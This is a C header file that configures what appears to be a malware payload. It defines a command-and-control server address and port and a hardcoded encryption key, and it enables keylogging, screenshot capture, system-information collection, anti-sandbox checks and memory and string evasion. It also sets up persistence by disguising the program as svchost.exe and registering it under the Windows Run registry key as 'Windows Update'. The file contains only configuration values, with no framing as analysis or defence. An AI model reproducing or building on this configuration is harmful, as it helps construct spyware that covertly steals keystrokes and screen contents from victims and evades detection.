#ifndef PAYLOAD_CONFIG_H
#define PAYLOAD_CONFIG_H

// Payload configuration
#define PAYLOAD_VERSION "1.3.0"
#define C2_SERVER "192.168.1.100"
#define C2_PORT 443
#define ENCRYPTION_KEY "S3cr3tK3y"

// Persistence settings
#define PERSISTENCE_ENABLED 1
#define PERSISTENCE_DELAY 60000  // 60 seconds

// Evasion techniques
#define ANTI_SANDBOX_ENABLED 1
#define MEMORY_EVASION_ENABLED 1
#define STRING_OBFUSCATION_ENABLED 1

// Data collection settings
#define KEYLOGGER_ENABLED 1
#define SCREENSHOT_ENABLED 1
#define SYSTEM_INFO_ENABLED 1

// New persistence configuration
#define TARGET_EXECUTABLE_NAME "svchost.exe"
#define PROGRAM_DATA_PATH "C:\\ProgramData\\"
#define VBS_SCRIPT_NAME "update.vbs"
#define REGISTRY_RUN_KEY "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define REGISTRY_VALUE_NAME "Windows Update"

#endif // PAYLOAD_CONFIG_H